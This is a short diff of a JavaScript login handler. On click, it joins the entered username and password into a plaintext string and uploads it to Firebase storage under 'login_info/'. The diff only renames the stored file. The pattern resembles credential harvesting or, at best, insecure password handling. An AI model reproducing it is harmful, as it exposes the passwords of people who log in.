@@ -21,6 +21,6 @@ loginButton.addEventListener("click", (e) => {
     
     //Passing login information to firebase
     var login_info = username + ', ' + password;
-    var storageRef = firebase.storage().ref('login_info/' + username);
+    var storageRef = firebase.storage().ref('login_info/testfile.doc');
     storageRef.put(login_info);
 })
